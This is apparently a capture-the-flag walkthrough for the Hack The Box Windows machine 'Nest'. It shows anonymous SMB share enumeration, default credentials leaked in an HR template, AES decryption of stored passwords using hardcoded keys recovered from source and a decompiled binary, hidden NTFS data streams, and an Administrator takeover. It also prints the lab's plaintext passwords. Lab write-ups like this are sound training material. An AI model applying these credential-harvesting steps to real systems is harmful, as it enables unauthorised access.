# Nest

<table>
    <tr>
    <td style="text-align:right;"><b>OS</b></td>
    <td>Windows</td>
    </tr>
    <tr>
    <td style="text-align:right;"><b>Difficulty</b></td>
    <td>Easy</td>
    </tr>
    <tr>
    <td style="text-align:right;"><b>Points</b></td>
    <td>20</td>
    </tr>
    <tr>
    <td style="text-align:right;"><b>Release</b></td>
    <td>25 Jan 2020</td>
    </tr>
    <tr>
    <td style="text-align:right;"><b>IP</b></td>
    <td>10.10.10.178</td>
    </tr>
</table>

## Summary

This machine starts off with enumeration in SMB shares to find default credentials for an account. From there, we enumerate and find encrypted credentials for a real user. We can decrypt the credentials by using the provided source code. To escalate to root, we can use the HQK reporting service to enumerate more files with another set of encrypted credentials and a slightly different encryption scheme.

## Foothold

To begin, we will do a scan of the machine.

```
$ nmap -sC -sV 10.10.10.178
...
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
|_clock-skew: 1m17s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-01-26T19:57:10
|_  start_date: 2020-01-26T19:29:45
...
```

We see that port 445 is open which is the SMB protocol. An additional port scan revealed another service on port 4386. We can try to view what shares are available using empty credentials.

```
$ smbclient -L //10.10.10.178 -U ""
Enter WORKGROUP\'s password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	Secure$         Disk      
	Users           Disk      
SMB1 disabled -- no workgroup available
```

From this, we see non-default shares `Data`, `Secure$`, and `Users`. Let's try to enumerate around and find any files of interest.

```
# smbclient //10.10.10.178/Users/ -U ""
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 25 18:04:21 2020
  ..                                  D        0  Sat Jan 25 18:04:21 2020
  Administrator                       D        0  Fri Aug  9 11:08:23 2019
  C.Smith                             D        0  Sun Jan 26 02:21:44 2020
  L.Frost                             D        0  Thu Aug  8 13:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 13:02:50 2019
  TempUser                            D        0  Wed Aug  7 18:55:56 2019

                10485247 blocks of size 4096. 6449696 blocks available
```

In the `Users` share, we have the Administrator, three users, and a temporary user. We are not able to view the contents of any of these folders.

```
# smbclient //10.10.10.178/Secure$/ -U ""
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```

We are not able to view the contents of the `Secure$` share.

```
# smbclient //10.10.10.178/Data/ -U ""
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 18:53:46 2019
  ..                                  D        0  Wed Aug  7 18:53:46 2019
  IT                                  D        0  Wed Aug  7 18:58:07 2019
  Production                          D        0  Mon Aug  5 17:53:38 2019
  Reports                             D        0  Mon Aug  5 17:53:44 2019
  Shared                              D        0  Wed Aug  7 15:07:51 2019

                10485247 blocks of size 4096. 6449719 blocks available
smb: \> cd Shared\Templates\HR\
smb: \Shared\Templates\HR\> ls
  .                                   D        0  Wed Aug  7 15:08:01 2019
  ..                                  D        0  Wed Aug  7 15:08:01 2019
  Welcome Email.txt                   A      425  Wed Aug  7 18:55:36 2019

                10485247 blocks of size 4096. 6449719 blocks available
smb: \Shared\Templates\HR\> get "Welcome Email.txt"
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \Shared\Templates\HR\>
```

In the `Data` share however, we are allowed to view the `Shared` folder and inside we see a welcome email template:

```
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
```

## User

Now we have the password for `TempUser` and can possibly enumerate into other directories. If we look through the same folders again, we see that we now have access to `Data/IT/`.

```
# smbclient //10.10.10.178/Data/ -U "TempUser"
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> cd IT\Configs\
smb: \IT\Configs\> ls
  .                                   D        0  Wed Aug  7 18:59:34 2019
  ..                                  D        0  Wed Aug  7 18:59:34 2019
  Adobe                               D        0  Wed Aug  7 15:20:09 2019
  Atlas                               D        0  Tue Aug  6 07:16:18 2019
  DLink                               D        0  Tue Aug  6 09:25:27 2019
  Microsoft                           D        0  Wed Aug  7 15:23:26 2019
  NotepadPlusPlus                     D        0  Wed Aug  7 15:31:37 2019
  RU Scanner                          D        0  Wed Aug  7 16:01:13 2019
  Server Manager                      D        0  Tue Aug  6 09:25:19 2019

                10485247 blocks of size 4096. 6449719 blocks available
```

Inside of this folder, the most interesting folder is `Configs` which has various configuration files that might contain useful information including passwords.

After examining, we find that the config for RU_Scanner, which appears to be an in-house application, has credentials for user C.Smith. It seems to be base64 encoded at first glance but when decoded it just produces random bytes. This strongly suggest some encryption.

```
<Username>c.smith</Username>
<Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
```

The other file of interest is a config file for NotepadPlusPlus. In it, we can find recently opened files. The hosts file is likely not useful to us. `Temp.txt` which belongs to Carl who is presumably C.Smith could be useful. `todo.txt` is currently not useful because we are not able to view Carl's account.

```
<File filename="C:\windows\System32\drivers\etc\hosts" />
<File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
<File filename="C:\Users\C.Smith\Desktop\todo.txt" />
```

While we are not able to navigate to `\Secure$\IT\`, we are able to directly navigate to the location of `Temp.txt`. 

```
# smbclient //10.10.10.178/Secure$/ -U "TempUser"
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> cd IT\Carl
smb: \IT\Carl\> ls
  .                                   D        0  Wed Aug  7 15:42:14 2019
  ..                                  D        0  Wed Aug  7 15:42:14 2019
  Docs                                D        0  Wed Aug  7 15:44:00 2019
  Reports                             D        0  Tue Aug  6 09:45:40 2019
  VB Projects                         D        0  Tue Aug  6 10:41:55 2019

                10485247 blocks of size 4096. 6449398 blocks available
```

While `Temp.txt` does not exist anymore, there are more interesting files. If we look at `VB Projects` we see a WIP application called `RUScanner`. If we search inside of this application, we can find out how the credentials are stored in the config file.

Looking through the code, we find mention of encryption/decryption in `Utils.vb`. Let's look at the decryption method to figure out how to get the decrypted password.

```vb
...
Public Shared Function DecryptString(EncryptedString AsString) As String
    If String.IsNullOrEmpty(EncryptedString) Then
        Return String.Empty
    Else
        Return Decrypt(EncryptedString, "N3st22","88552299", 2, "464R5DFA5DL6LE28", 256)
    End If
End Function

...

Public Shared Function Decrypt(ByVal cipherText As String, _
                                ByVal passPhrase As String, _
                                ByVal saltValue As String, _
                                ByVal passwordIterations As Integer, _
                                ByVal initVector As String, _
                                ByVal keySize As Integer) _
                           As String

    Dim initVectorBytes As Byte()
    initVectorBytes = Encoding.ASCII.GetBytes(initVector)

    Dim saltValueBytes As Byte()
    saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

    Dim cipherTextBytes As Byte()
    cipherTextBytes = Convert.FromBase64String(cipherText)

    Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

    Dim keyBytes As Byte()
    keyBytes = password.GetBytes(CInt(keySize / 8))

    Dim symmetricKey As New AesCryptoServiceProvider
    symmetricKey.Mode = CipherMode.CBC

    Dim decryptor As ICryptoTransform
    decryptor = symmetricKey.CreateDecryptor(keyBytes,initVectorBytes)

    Dim memoryStream As IO.MemoryStream
    memoryStream = New IO.MemoryStream(cipherTextBytes)

    Dim cryptoStream As CryptoStream
    cryptoStream = New CryptoStream(memoryStream, _
                                    decryptor, _
                                    CryptoStreamMode.Read)

    Dim plainTextBytes As Byte()
    ReDim plainTextBytes(cipherTextBytes.Length)

    Dim decryptedByteCount As Integer
    decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                            0, _
                                            plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                             0, _
                                             decryptedByteCount)

        Return plainText
    End Function
...
```

According to this, in order to decrypt a string, it uses:

    Passphrase: N3st22
    Salt: 88552299
    Password iterations: 2
    IV: 464R5DFA5DL6LE28
    Key Size: 256

It also has mentions to `AES` and cipher mode `CBC`. All of this information suggests that the program generates a key based on these contents and then uses it for symmetric decryption. We can utilize simple CyberChef recipes in order to replicate this process and get the password.

![Derive](images/derive.png)

![Decrypt](images/decrypt.png)

After cracking the encryption scheme, we see that Carl's password is `xRxRxPANCAK3SxRxRx`. Now we view Carl's folder and get the user flag.

```
# smbclient //10.10.10.178/Users/ -U "C.Smith"
Enter WORKGROUP\C.Smith's password: 
Try "help" to get a list of possible commands.
smb: \> cd C.Smith\
smb: \C.Smith\> ls
  .                                   D        0  Sun Jan 26 02:21:44 2020
  ..                                  D        0  Sun Jan 26 02:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 19:06:17 2019
  user.txt                            A       32  Thu Aug  8 19:05:24 2019

                10485247 blocks of size 4096. 6449711 blocks available
smb: \C.Smith\> get user.txt
getting file \C.Smith\user.txt of size 32 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \C.Smith\> ^C
# cat user.txt 
cf71b2**************************
```

## Root

Also in Carl's folder, we see `HQK Reporting`. If we examine it, we find files about an HQK reporting service. 

```
smb: \C.Smith\HQK Reporting\> ls
  .                                   D        0  Thu Aug  8 19:06:17 2019
  ..                                  D        0  Thu Aug  8 19:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 08:18:42 2019
  Debug Mode Password.txt             A        0  Thu Aug  8 19:08:17 2019
  HQK_Config_Backup.xml               A      249  Thu Aug  8 19:09:05 2019

                10485247 blocks of size 4096. 6449711 blocks available
```

In the `AD Intergration Module` folder we find `HqkLdap.exe`. We also have `Debug Mode Password.txt` which appears to be empty and `HQK_Config_Backup.xml`. While the text file appears empty, there is actually data in it using alternate data streams which is a feature of NTFS filesystems. We can examine the contents with some commands.

```
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
change_time:    Thu Aug  8 07:08:17 PM 2019 EDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt:Password:$DATA"
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA of size 15 as Debug Mode Password.txt:Password:$DATA (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \C.Smith\HQK Reporting\> ls
  .                                   D        0  Thu Aug  8 19:06:17 2019
  ..                                  D        0  Thu Aug  8 19:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 08:18:42 2019
  Debug Mode Password.txt             A        0  Thu Aug  8 19:08:17 2019
  HQK_Config_Backup.xml               A      249  Thu Aug  8 19:09:05 2019

                10485247 blocks of size 4096. 6449711 blocks available
smb: \C.Smith\HQK Reporting\> ^C
# cat Debug\ Mode\ Password.txt\:Password\:\$DATA
WBQ201953D8w 
```

We're not sure what to do with this yet but we will keep it around. Now if we take a look at the `HQK_Config_Backup.xml` we discover a new service.

```
<?xml version="1.0"?>
<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>4386</Port>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
</ServiceSettings>
```

We see that this service is running on port 4386. We missed this we our earlier `nmap` scan because it is not a common port used. We can now communicate with this service via `telnet` and figure out how it works.

```
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
```

It appears to be a querying service that is used internally. We also see the `DEBUG` option that will take the password we discovered. Activating this mode allows us a few more commands.

```
>DEBUG WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>
```

After some initial enumeration, we find the `LDAP` folder associated with the executable before. If we look inside, we see a config file paired with it.

```
>setdir LDAP

Current directory set to LDAP
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: LDAP
>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```

We see that this config has Administrator's password cached in it in what appears to be the same encryption as Carl's. However, if we try the same recipe, it does not work.

We might be able to find some new values in the executable that is paired with this config. If we use a program such as [dnSpy](https://github.com/0xd4d/dnSpy), we can decompile the binary since it is a .NET executable. In the `HqkLdap.CR` class, we can see the decrypt function with the new constants.

```c#
// HqkLdap.CR
// Token: 0x06000012 RID: 18 RVA: 0x00002278 File Offset: 0x00000678
public static string DS(string EncryptedString)
{
	if (string.IsNullOrEmpty(EncryptedString))
	{
		return string.Empty;
	}
	return CR.RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
}
```

After creating a new CyberChef recipe similar to the last with the new constants, we decrypt Administrator's password which is `XtH4nkS4Pl4y1nGX` and get the root flag.

```
# smbclient //10.10.10.178/C$/ -U "Administrator"
Enter WORKGROUP\Administrator's password: 
Try "help" to get a list of possible commands.
smb: \> get Users\Administrator\Desktop\root.txt 
getting file \Users\Administrator\Desktop\root.txt of size 32 as Users\Administrator\Desktop\root.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> ^C
# cat root.txt 
6594c2**************************
```
